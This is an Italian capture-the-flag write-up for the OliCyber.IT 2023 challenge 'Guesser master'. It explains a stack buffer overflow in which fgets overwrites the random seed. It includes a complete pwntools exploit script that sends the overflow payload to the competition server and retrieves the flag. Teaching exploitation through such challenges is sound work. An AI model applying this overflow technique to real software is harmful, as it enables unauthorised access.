# OliCyber.IT 2023 - Competizione Nazionale

## [binary] Guesser master (32 risoluzioni)

La challenge è un normale binario linkato dinamicamente. All'esecuzione il binario chiede un input, lo confronta con dei dati segreti apparentemente generati casualmente ad ogni esecuzione. Se le stringhe sono uguali, il binario stampa la flag, altrimenti chiude la connessione.

### Soluzione

I dati sono effettivamente generati casualmente, se andiamo a fare un po' di reverse engineering del binario. Vediamo che nel main viene chiamata la funzione `srand` della libc, che setta il seed del PRNG della libreria standard del C. Il seed viene settato ad una variabile locale che era stata precedentemente popolata con dei byte casuali letti effettivamente da `/dev/urandom`, usando una funzione che in C, dopo un po' di reverse engineering, si può scrivere

```c

void rand32(unsigned int *r) {
  FILE *f = fopen("/dev/urandom", "r");
  unsigned long rv = fread(r, sizeof(*r), 1, f);
  if (rv != 1) {
    fprintf(stderr, "Error reading from /dev/urandom. Please contact a gabibbo");
    exit(1);
  }
  fclose(f);
}
```

Sembra quindi che i dati siano davvero random. Non c'è speranza quindi di indovinarli utilizzando qualche trucco crittografico. Tuttavia notiamo però che l'ordine in cui vengono eseguite le azioni è il seguente:

```c
  rand32(&seed);
  printf("input: ");
  fgets(password, 0x200, stdin);
  srand(seed);

  for (int i = 0; i < 0x100-1; i++) {
    g_password[i] = rand() % 0x19 + 0x41;
  }

```

Quindi il seed random viene settato dopo che noi abbiamo inserito il nostro input, cosa che è abbastanza strana. In effetti, controllando la dimensione delle variabili, possiamo notare che la `fgets` non scrive solo su `password`, ma scrive anche oltre, in quanto la variabile `password` è più corta di 0x200 caratteri. Utilizzando per esempio `Edit stack frame` di ghidra, possiamo notare come dopo la variabile password ci sia proprio il seed random che è appena stato pescato da `/dev/urandom`.

La strategia è quindi:

- sovrascrivere il seed random con un valore noto
- calcolare in parte la password che genererebbe questo seed
- dare la password corretta al programma

Per essere ancora più pigri, possiamo eseguire localmente il programma usando gdb, fornire l'input che sovrascrive il seed random ed esaminare la memoria in cui è salvata la password che dobbiamo copiare. In questo modo non dobbiamo nemmeno capire l'algoritmo che genera la password.

### Exploit

```python
#!/usr/bin/env python3

from pwn import ELF, context, process, flat, p64, args, remote
import os
import logging

logging.disable()

exe = context.binary = ELF(os.path.dirname(os.path.realpath(__file__)) + '/guesser_master')
HOST = os.environ.get("HOST", "guessmaster.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 35006))


io = process([exe.path], env={"FLAG": "flag{test}"}) if args.LOCAL else remote(HOST, PORT)
# ui.pause()
io.sendlineafter(b"input: ", flat({
    0x0: b"ILCPSKLRYVMCPJNBPBWLLSREHFMXRKECWITRSGLREXVTJMXYPUNBQFGXMUVGFAJCLFVENHYUHUORJOSAMIBDNJDBEYHKBSOMBLTOUUJDRBWCRRCGBFLQPOTTPEGRWVGAJCRGWDLPGITYDVHEDTUSIPPYVXSUVBVFENODQASAJOYOMGSQCPJLHBMDAHYVIUEMKSSDSLDEBESNNNGPESDNTRRVYSUIPYWATPFOELTHROWHFEXLWDYSVSPWLKFBLFD\x00",
    0x100: p64(0),
}))
io.recvuntil(b"Flag: ")
flag = io.recvline().decode().strip()
print(flag)
io.close()

```
